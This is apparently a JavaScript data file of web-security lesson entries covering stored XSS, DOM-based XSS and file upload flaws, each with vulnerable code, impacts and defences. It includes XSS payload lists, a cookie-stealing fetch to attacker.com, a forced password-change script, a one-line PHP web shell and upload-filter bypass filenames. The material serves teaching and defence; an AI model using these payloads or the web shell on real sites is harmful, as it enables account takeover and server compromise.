allVulnerabilities.push(
{
    "id": 9,
    "title": "Stored Cross-Site Scripting (Stored XSS)",
    "summary": `
        <p><b>Stored Cross-Site Scripting (Stored XSS)</b>, also known as Persistent XSS, is one of the most dangerous XSS variants. Unlike Reflected XSS, the malicious script is permanently stored on the target server (e.g., in a database, forum post, or comment field). As a result, the payload executes automatically every time a victim views the affected page.</p>

        

        <h3>How it Works:</h3>
        <p>The application accepts input from a user and saves it to a database without proper sanitization or encoding. When other users (or administrators) subsequently view that content, the application serves the malicious script to their browsers, which then execute it within the context of the site.</p>

        <h3>Example of a Vulnerable Comment System:</h3>
        <pre><code>// PHP Example - Vulnerable
$comment = $_POST['comment'];
$query = "INSERT INTO comments (comment) VALUES ('$comment')";
mysqli_query($conn, $query);

// Rendering the comment later
echo $row['comment'];</code></pre>
        <p>Since the comment is echoed directly without encoding, any <code>&lt;script&gt;</code> tag injected by an attacker will be rendered as executable code by the browser.</p>

        <h3>Why Stored XSS is More Dangerous:</h3>
        <ul>
            <li><b>Automatic Execution:</b> It requires no social engineering to trick a user into clicking a link; the attack triggers simply by visiting the page.</li>
            <li><b>Scale:</b> A single injected payload can affect thousands of users, including site administrators.</li>
            <li><b>Persistence:</b> The script remains active until it is manually removed from the database.</li>
        </ul>

        <h3>Common Payloads:</h3>
        <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></pre>

        <h3>Impacts:</h3>
        <ul>
            <li><b>Session Hijacking:</b> Stealing cookies to take over user accounts.</li>
            <li><b>Administrative Compromise:</b> If an admin views the malicious comment, the script can perform administrative actions (e.g., creating new admin users, changing settings).</li>
            <li><b>Credential Phishing:</b> Modifying the DOM to display fake login forms to capture passwords.</li>
            <li><b>Malicious Redirects:</b> Forcing users to navigate to malicious or phishing sites.</li>
        </ul>

        <h3>Detection & Automation:</h3>
        <p>Use tools like <b>Burp Suite</b> to intercept the POST request, <b>XSStrike</b> for payload testing, or <b>Dalfox</b> to automate finding stored injection points.</p>

        <h3>Prevention Methods:</h3>
        <ol>
            <li><b>Output Encoding (Primary Defense):</b> Always encode user-supplied data before rendering it in the browser (e.g., use <code>htmlspecialchars()</code> in PHP or template engines like Twig/Jinja2 that auto-escape).</li>
            <li><b>Input Sanitization:</b> Use battle-tested libraries like <b>DOMPurify</b> to strip out malicious HTML/JS while keeping safe formatting.</li>
            <li><b>Content Security Policy (CSP):</b> Implement a strict CSP to block inline scripts and restrict the domains from which scripts can be loaded.</li>
            <li><b>HttpOnly Cookies:</b> Prevents client-side scripts from accessing session cookies, mitigating the risk of session hijacking.</li>
            <li><b>Avoid Inline JavaScript:</b> Never use <code>onclick</code>, <code>onerror</code>, or <code>onmouseover</code> attributes in HTML.</li>
        </ol>

        <h3>Summary of XSS Types:</h3>
        <ul>
            <li><b>Reflected XSS:</b> Payload is part of the request, reflected immediately.</li>
            <li><b>Stored XSS:</b> Payload is stored on the server, served to multiple users.</li>
            <li><b>DOM-based XSS:</b> Vulnerability is entirely in client-side code execution.</li>
        </ul>
    `
},

{
    "id": 10,
    "title": "DOM-Based Cross-Site Scripting (DOM XSS)",
    "summary": `
        <p><b>DOM-Based XSS</b> is a unique type of XSS vulnerability that occurs entirely on the client side. Unlike Reflected or Stored XSS, the server is not involved in the injection; the vulnerability exists in the JavaScript code that processes data from the DOM (Document Object Model) in an unsafe manner.</p>

        

        <h3>The Core Concept:</h3>
        <p>In DOM XSS, an application contains client-side JavaScript that processes data from an untrusted <b>Source</b> (like the URL fragment or query string) and passes it to an unsafe <b>Sink</b> (a function or DOM object that can execute or render code).</p>

        <h3>Sources vs. Sinks:</h3>
        <ul>
            <li><b>Sources:</b> JavaScript properties that the attacker can control (e.g., <code>location.search</code>, <code>location.hash</code>, <code>document.referrer</code>).</li>
            <li><b>Sinks:</b> Functions that execute code or render HTML (e.g., <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code>, <code>setTimeout()</code>).</li>
        </ul>

        <h3>Vulnerable Example:</h3>
        <pre><code>// The script reads data from the URL fragment (Source)
var name = location.hash.substring(1);

// And writes it directly into the page (Sink)
document.getElementById("output").innerHTML = name;</code></pre>
        <p>If an attacker visits: <code>http://target.com/#&lt;img src=x onerror=alert(1)&gt;</code>, the browser executes the script automatically.</p>

        <h3>Why DOM XSS is Unique:</h3>
        <p>Because the malicious payload never reaches the server, it often bypasses traditional Web Application Firewalls (WAFs) that only inspect HTTP requests sent to the server. The entire attack happens within the victim's browser.</p>

        <h3>Common Dangerous Sinks:</h3>
        <ul>
            <li><code>innerHTML</code> / <code>outerHTML</code></li>
            <li><code>document.write()</code></li>
            <li><code>eval()</code></li>
            <li><code>setTimeout()</code> / <code>setInterval()</code> (when passing a string instead of a function)</li>
        </ul>

        <h3>Practical Exploitation Examples:</h3>
        <ul>
            <li><b>Using <code>document.write()</code>:</b> <code>http://target.com/#&lt;svg onload=alert(1)&gt;</code></li>
            <li><b>Using <code>eval()</code>:</b> <code>http://target.com/#alert(document.cookie)</code></li>
        </ul>

        <h3>Detection Techniques:</h3>
        <p>Detecting DOM XSS requires analyzing client-side JavaScript. Modern tools like <b>Burp Suite's DOM Invader</b> specifically instrument the browser to identify data flowing from sources to dangerous sinks.</p>

        <h3>Prevention Methods:</h3>
        <ol>
            <li><b>Use Safe Sinks:</b> Replace dangerous sinks like <code>innerHTML</code> with safe alternatives like <code>textContent</code> or <code>innerText</code>, which treat input as plain text, not HTML.</li>
            <li><b>Sanitize Input:</b> Use trusted libraries like <b>DOMPurify</b> to strip dangerous HTML tags and attributes from any input before it reaches a sink.</li>
            <li><b>Avoid <code>eval()</code>:</b> Never pass untrusted data to <code>eval()</code>, <code>setTimeout()</code>, or <code>setInterval()</code>.</li>
            <li><b>Content Security Policy (CSP):</b> A robust CSP can prevent the execution of unauthorized scripts, significantly reducing the impact of a DOM XSS vulnerability.</li>
            <li><b>Use Modern Frameworks:</b> Frameworks like React or Angular are designed to automatically encode data when rendering, which helps protect against most XSS scenarios.</li>
        </ol>

        <h3>Comparison:</h3>
        <ul>
            <li><b>Reflected XSS:</b> The server receives the payload and reflects it back in the HTTP response.</li>
            <li><b>Stored XSS:</b> The server stores the payload in a database and serves it to users.</li>
            <li><b>DOM XSS:</b> The vulnerability exists entirely in the client-side JavaScript processing; the server never sees the payload.</li>
        </ul>

        <h3>Criticality:</h3>
        <p>DOM XSS is highly dangerous because it is often "invisible" to server-side security controls. As modern web applications rely more heavily on client-side logic, DOM XSS has become a primary target for attackers seeking to hijack user sessions or perform actions on behalf of the victim.</p>
    `
},

{
    "id": 11,
    "title": "DOM Based XSS in JavaScript",
    "summary": `
        <p><b>DOM Based XSS</b> is considered one of the most dangerous types of Cross Site Scripting because it happens entirely inside the browser (Client Side) without requiring modification of the server response or storing data inside the database.</p>

        <p>In this type of vulnerability, JavaScript inside the page reads user input from the DOM or from the URL and injects it into the page in an unsafe way, allowing the execution of malicious JavaScript code.</p>

        <h3>What is the DOM?</h3>

        <p>The DOM stands for <b>Document Object Model</b>, which is the structure used by the browser to represent HTML page elements and interact with them through JavaScript.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application uses data that the user can control and places it inside the page using dangerous functions such as:</p>

        <pre><code>innerHTML
document.write()
eval()
setTimeout()
setInterval()</code></pre>

        <h3>Weak Practical Example:</h3>

        <pre><code>// JavaScript Example

var name = location.hash.substring(1);

document.getElementById("output").innerHTML = name;</code></pre>

        <p>The code reads data from the URL and directly inserts it into the page without filtering.</p>

        <h3>Exploitation Example:</h3>

        <pre><code>http://target.com/#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

        <p>When the link is opened, the JavaScript code will execute inside the browser.</p>

        <h3>Why is DOM XSS Different?</h3>

        <p>In Reflected or Stored XSS, the server is responsible for injecting the data into the page.</p>

        <p>In DOM XSS, the JavaScript inside the browser itself causes the vulnerability.</p>

        <h3>Dangerous Data Sources:</h3>

        <p>The application reads data from locations that the user can control.</p>

        <pre><code>location.href
location.search
location.hash
document.URL
document.referrer
window.name</code></pre>

        <h3>Dangerous Execution Sinks:</h3>

        <pre><code>innerHTML
outerHTML
document.write()
eval()
setTimeout()
setInterval()</code></pre>

        <h3>Example of Dangerous innerHTML Usage:</h3>

        <pre><code>var input = location.search;

document.body.innerHTML = input;</code></pre>

        <p>If the attacker sends the following link:</p>

        <pre><code>http://target.com/?&lt;img src=x onerror=alert(1)&gt;</code></pre>

        <p>The code will execute inside the browser.</p>

        <h3>Example of document.write() Exploitation:</h3>

        <pre><code>document.write(location.hash);</code></pre>

        <p>Malicious link:</p>

        <pre><code>http://target.com/#&lt;svg onload=alert(1)&gt;</code></pre>

        <h3>eval() Exploitation:</h3>

        <pre><code>eval(location.hash.substring(1));</code></pre>

        <p>Link:</p>

        <pre><code>http://target.com/#alert(document.cookie)</code></pre>

        <h3>Cookie Theft:</h3>

        <pre><code>&lt;script&gt;
fetch('http://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;</code></pre>

        <p>If the cookies are not protected with HttpOnly, the attacker will be able to steal them.</p>

        <h3>Performing Actions as the Victim:</h3>

        <pre><code>&lt;script&gt;
fetch('/change-password', {
method:'POST',
body:'password=hacked123'
});
&lt;/script&gt;</code></pre>

        <h3>Testing the Vulnerability Using DevTools:</h3>

        <p>The tester opens the Developer Tools and tracks data sources inside JavaScript.</p>

        <h3>Testing the Vulnerability Using Burp Suite:</h3>

        <pre><code>GET /#&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>DOM XSS Detection Tools:</h3>

        <pre><code>Burp Suite DOM Invader
DOM XSS Scanner
XSStrike
Dalfox
OWASP ZAP</code></pre>

        <h3>Common Payload Types:</h3>

        <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;

&lt;img src=x onerror=alert(1)&gt;

&lt;svg onload=alert(1)&gt;

javascript:alert(1)

&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></pre>

        <h3>Indicators of DOM XSS:</h3>

        <p>1. Usage of innerHTML or document.write.</p>
        <p>2. Reading data from the URL.</p>
        <p>3. Executing JavaScript without additional interaction.</p>
        <p>4. Lack of filtering or encoding.</p>

        <h3>Example of Safe Code:</h3>

        <pre><code>// Safe Example

var name = location.hash.substring(1);

document.getElementById("output").textContent = name;</code></pre>

        <p>Using <code>textContent</code> prevents the execution of HTML or JavaScript.</p>

        <h3>Correct Protection Methods:</h3>

        <p><b>1. Avoid using innerHTML.</b></p>

        <p><b>2. Use textContent or innerText.</b></p>

        <p><b>3. Prevent the use of eval().</b></p>

        <p><b>4. Filter data coming from the URL.</b></p>

        <p><b>5. Use Content Security Policy (CSP).</b></p>

        <p><b>6. Use Sanitization libraries such as DOMPurify.</b></p>

        <h3>Difference Between XSS Types:</h3>

        <p><b>Reflected XSS:</b> The code comes from the request and is displayed by the server.</p>

        <p><b>Stored XSS:</b> The code is stored inside the database.</p>

        <p><b>DOM XSS:</b> The execution happens entirely inside JavaScript within the browser.</p>

        <h3>Vulnerability Severity:</h3>

        <p>DOM Based XSS allows attackers to steal user sessions, execute actions inside user accounts, modify page content, redirect victims, or create phishing pages within the same website, making it one of the most dangerous modern JavaScript vulnerabilities.</p>
    `
},

{
    "id": 12,
    "title": "File Upload Vulnerability",
    "summary": `
        <p><b>File Upload Vulnerability</b> is one of the most dangerous web application vulnerabilities because it allows attackers to upload malicious files to the server. If the application does not properly validate uploaded files, attackers may execute remote code, gain access to sensitive data, or completely compromise the server.</p>

        <p>This vulnerability commonly appears in upload features such as profile pictures, attachments, documents, media files, or administrative panels.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application accepts user-uploaded files without performing proper validation on file type, extension, content, or storage location.</p>

        <h3>Common Weak Validation Methods:</h3>

        <pre><code>Checking file extension only

Checking MIME type only

Blacklisting dangerous extensions

Trusting client-side validation</code></pre>

        <h3>Dangerous File Types:</h3>

        <pre><code>.php
.jsp
.asp
.aspx
.cgi
.py
.pl</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

move_uploaded_file(
    $_FILES['file']['tmp_name'],
    "uploads/" . $_FILES['file']['name']
);</code></pre>

        <p>The application uploads the file directly without validation.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>shell.php</code></pre>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <p>If the file is uploaded successfully, the attacker may execute commands using:</p>

        <pre><code>http://target.com/uploads/shell.php?cmd=whoami</code></pre>

        <h3>Why is File Upload Dangerous?</h3>

        <p>Successful exploitation may allow attackers to execute remote commands, upload web shells, bypass authentication, steal sensitive files, or fully take control of the server.</p>

        <h3>Common Upload Bypass Techniques:</h3>

        <pre><code>shell.php.jpg

shell.phtml

shell.php%00.jpg

shell.php....

shell.php;.jpg</code></pre>

        <h3>MIME Type Bypass:</h3>

        <p>Some applications only verify the MIME type sent by the browser.</p>

        <pre><code>Content-Type: image/jpeg</code></pre>

        <p>An attacker can modify the request manually using Burp Suite.</p>

        <h3>Double Extension Bypass:</h3>

        <pre><code>shell.php.jpg</code></pre>

        <p>Some servers may still execute the file as PHP depending on server configuration.</p>

        <h3>Null Byte Injection:</h3>

        <pre><code>shell.php%00.jpg</code></pre>

        <p>Older systems may stop processing the filename after the null byte.</p>

        <h3>Image-Based Payloads:</h3>

        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <p>The attacker hides malicious code inside image files.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Code Execution (RCE).</p>
        <p>2. Uploading Web Shells.</p>
        <p>3. Defacing websites.</p>
        <p>4. Stealing sensitive data.</p>
        <p>5. Gaining persistent access.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /upload HTTP/1.1
Host: vulnerable-site.com

Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg</code></pre>

        <h3>Common Web Shells:</h3>

        <pre><code>C99 Shell
WSO Shell
b374k
China Chopper</code></pre>

        <h3>Indicators of File Upload Vulnerability:</h3>

        <p>1. Missing file extension validation.</p>
        <p>2. Upload directory accessible publicly.</p>
        <p>3. Uploaded files execute as scripts.</p>
        <p>4. Weak MIME type verification.</p>
        <p>5. No file content inspection.</p>

        <h3>Dangerous Upload Locations:</h3>

        <pre><code>/uploads/
/images/
/avatars/
/files/</code></pre>

        <h3>Example of Weak Blacklist Filtering:</h3>

        <pre><code>if(filename != ".php")</code></pre>

        <p>Attackers can bypass weak blacklist filters using alternative extensions.</p>

        <h3>Safe Validation Example:</h3>

        <pre><code>// Secure Example

Allow only specific extensions

Verify MIME type

Validate file signatures

Rename uploaded files

Store files outside web root</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use whitelist validation instead of blacklist validation.</b></p>

        <p><b>2. Verify file signatures and content.</b></p>

        <p><b>3. Rename uploaded files randomly.</b></p>

        <p><b>4. Store uploaded files outside the web root.</b></p>

        <p><b>5. Disable script execution inside upload directories.</b></p>

        <p><b>6. Restrict file permissions.</b></p>

        <p><b>7. Limit file size and upload types.</b></p>

        <h3>Common Security Configurations:</h3>

        <pre><code>Disable PHP execution in uploads/

Use separate file servers

Apply Content Security Policy (CSP)

Scan uploads using antivirus solutions</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Difference Between Safe and Unsafe Uploads:</h3>

        <p><b>Unsafe Upload:</b> The application stores user files directly and allows script execution.</p>

        <p><b>Safe Upload:</b> The application validates, sanitizes, renames, and securely stores uploaded files.</p>

        <h3>Vulnerability Severity:</h3>

        <p>File Upload Vulnerability is extremely critical because a successful attack may lead to full server compromise, remote command execution, malware deployment, data theft, or complete website takeover.</p>
    `
},

);


